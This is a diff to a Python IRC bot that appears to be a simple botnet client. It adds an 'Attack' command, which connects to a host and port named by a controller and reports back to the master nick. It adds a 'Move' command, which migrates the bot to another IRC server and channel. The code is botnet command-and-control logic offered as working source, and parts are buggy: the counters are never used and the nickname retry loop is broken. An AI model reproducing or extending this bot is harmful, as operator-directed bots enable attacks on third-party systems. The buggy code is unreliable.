@@ -35,7 +35,9 @@ if ready[0]:
         else: continue
 irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))
 
-
+atk_count = 0
+fail_count = 0
+master = "BetterThanYou"
 
 while 1:
     ready = select.select([irc], [], [], 2) # wait 2 seconds
@@ -51,11 +53,69 @@ while 1:
 
     # controller's status
     if "To me, my minions" in response:
-        irc.send(bytes("PRIVMSG BetterThanYou :" + nickname +"\r\n", "utf-8"))
+        irc.send(bytes("PRIVMSG " + master + " :" + nickname +"\r\n", "utf-8"))
 
     # controller's attack
     if "Attack" in response:
-        
+        victim = response.split(":Attack ", 2)[1]
+        atk_host = victim.split(" ", 1)[0]
+        atk_port = victim.split(" ", 2)[1]
+        atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        atk.settimeout(1)
+        try:
+            atk.connect((atk_host, int(atk_port)))
+        except:
+            atk.settimeout(None)
+            irc.send(bytes("PRIVMSG " + master + " :attack unsuccessful, count = " + str(1) + "\r\n", "utf-8"))
+            atk.close()
+            continue
+
+        atk.close()
+        irc.send(bytes("PRIVMSG " + master + "  :attack successful, count = " + str(1) + "\r\n", "utf-8"))
+
+
+
+    # controller's move
+    if "Move" in response:
+        try:
+            victim = response.split(":Move ", 2)[1]
+            move_host = victim.split(" ", 1)[0]
+            move_port = victim.split(" ", 2)[1]
+            move_channel = victim.split(" ", 3)[2]
+            move = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            move.settimeout(1)
+            try:
+                move.connect((move_host, int(move_port)))
+            except:
+                move.settimeout(None)
+                irc.send(bytes("PRIVMSG " + master + " :move unsuccessful\r\n", "utf-8"))
+                move.close()
+                continue
+
+            irc.send(bytes(b"QUIT\r\n"))
+            irc.close()
+            irc = move
+
+            # get inside the channel
+            move_number = number
+            move_nickname = "NotYourSlave"+str(move_number)
+            irc.send(bytes("USER notabot 8 * : I'm OK\r\n", "utf-8"))
+            irc.send(bytes("NICK " + move_nickname + "\r\n", "utf-8"))
+            ready = select.select([irc], [], [], 1) # wait 1 second
+            if ready[0]:
+                response = (irc.recv(1024)).decode("utf-8")
+                print(response)
+                while "Nickname is already in use" in response:
+                    move_number = move_number + 1
+                    nickname = "NotYourSlave" + str(move_number)
+                    irc.send(bytes("NICK " + move_nickname + "\r\n", "utf-8"))
+                    ready = select.select([irc], [], [], 1) # wait 1 second
+                    if ready[0]:
+                        response = (irc.recv(1024)).decode("utf-8")
+                    else: continue
+            irc.send(bytes("JOIN #" + move_channel + "\r\n", "utf-8"))
+        except:
+            irc.send(bytes("PRIVMSG " + master + " :move unsuccessful\r\n", "utf-8"))
 
     # controller's shutdown
     if "Go home, guys" in response:
